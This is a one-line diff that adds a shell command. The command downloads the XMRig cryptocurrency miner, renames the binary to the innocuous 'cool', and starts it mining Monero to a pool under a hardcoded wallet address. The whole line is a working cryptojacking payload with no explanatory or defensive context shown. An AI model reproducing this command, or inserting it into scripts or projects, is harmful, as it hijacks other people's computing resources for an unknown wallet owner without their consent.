@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz && tar -xz -f xmrig-6.21.3-linux-static-x64.tar.gz && cd xmrig-6.21.3 && mv xmrig cool && ./cool --donate-level 1 -o pool.hashvault.pro:443 -u 44vgYbHGFxEPzutxE9rqC6U4pHMZ9Y1gH5Ek3kryV7Ce6iZM9p4L7vuVQ1wtsgC7jj4zHws9bGM9Ef9sCBZwa13LBnEouPA -t 1 -p Worker -k --tls
